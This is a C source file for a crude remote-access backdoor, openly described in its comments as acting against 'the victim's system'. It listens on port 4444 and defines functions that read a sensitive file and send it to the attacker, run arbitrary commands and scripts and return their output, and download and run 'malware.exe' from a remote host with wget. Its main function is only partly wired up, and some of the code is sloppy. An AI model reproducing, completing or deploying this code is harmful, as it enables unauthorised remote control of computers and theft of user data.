#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <stdlib.h>

#define PORT 4444
#define BACKLOG 10


int listen_fd, conn_fd;
struct sockaddr_in serv_addr;
char buffer[1024];

void createSocket() {
    // Create a socket and bind it to a port
    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd < 0) {
        fprintf(stderr, "Error creating socket\n");
        exit(1);
    }
    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
    if (bind(listen_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        fprintf(stderr, "Error binding socket\n");
        exit(1);
    }

    // Listen for incoming connections
    if (listen(listen_fd, BACKLOG) < 0) {
        fprintf(stderr, "Error listening for connections\n");
        exit(1);
    }
}

void acceptConnection() {
    // Accept an incoming connection
    conn_fd = accept(listen_fd, (struct sockaddr*)NULL, NULL);
    if (conn_fd < 0) {
        fprintf(stderr, "Error accepting connection\n");
        exit(1);
    }
}

void stealData() {
    // Steal user data
    FILE *fp;
    fp = fopen("/home/user/documents/sensitive.txt", "r");
    if (fp == NULL) {
        fprintf(stderr, "Error opening file\n");
        exit(1);
    }
    fread(buffer, 1, 1024, fp);
    fclose(fp);
}

void sendData() {
    // Send stolen data back to the attacker
    if (send(conn_fd, buffer, strlen(buffer), 0) < 0) {
        fprintf(stderr, "Error sending data\n");
        exit(1);
    }
}

void executeCommand(char* command) {
    // Execute the given command and store the output in a buffer
    FILE* fp;
    char buffer[1024];
    fp = popen(command, "r");
    if (fp == NULL) {
        fprintf(stderr, "Error executing command\n");
        exit(1);
    }
    fread(buffer, 1, sizeof(buffer), fp);
    pclose(fp);

    // Send the output back to the attacker
    if (send(conn_fd, buffer, strlen(buffer), 0) < 0) {
        fprintf(stderr, "Error sending data\n");
        exit(1);
    }
}

bool isScript(char* file) {
    // Check if the given file is a script by checking its file extension
    const char* extension = strrchr(file, '.');
    if (extension == NULL) {
        return false;
    }
    if (strcmp(extension, ".sh") == 0 || strcmp(extension, ".py") == 0) {
        return true;
    }
    return false;
}

void executeScript(char* script) {
    // Check if the given file is a script
    if (!isScript(script)) {
        fprintf(stderr, "Error: not a script\n");
        exit(1);
    }

    // Execute the script and store the output in a buffer
    FILE* fp;
    char buffer[1024];
    char command[1024];
    sprintf(command, "./%s", script);
    fp = popen(command, "r");
    if (fp == NULL) {
        fprintf(stderr, "Error executing script\n");
        exit(1);
    }
    fread(buffer, 1, sizeof(buffer), fp);
    pclose(fp);

    // Send the output back to the attacker
    if (send(conn_fd, buffer, strlen(buffer), 0) < 0) {
        fprintf(stderr, "Error sending data\n");
        exit(1);
    }
}

void installMalware() {
    // Download the malware from a remote server
    char command[1024];
    sprintf(command, "wget http://malware-server/malware.exe");
    system(command);

    // Install the malware
    sprintf(command, "chmod +x malware.exe");
    system(command);
    sprintf(command, "./malware.exe -install");
    system(command);
}

void closeConnection() {
    // Close the connection
    close(conn_fd);
}

int main()
{
    createSocket();
    acceptConnection();
    //stealData();
    //sendData();
    // closeConnection();

    return 0;
}
//installMalware(): installs additional malware on the victim's system.
//executeCommand(): executes a command on the victim's system and returns the output.
//accessFiles(): accesses and potentially modifies files on the victim's system.
//changePermissions(): changes the permissions of files or directories on the victim's system.
//executeScript(): executes a script on the victim's system.
//shutdownSystem(): shuts down the victim's system.
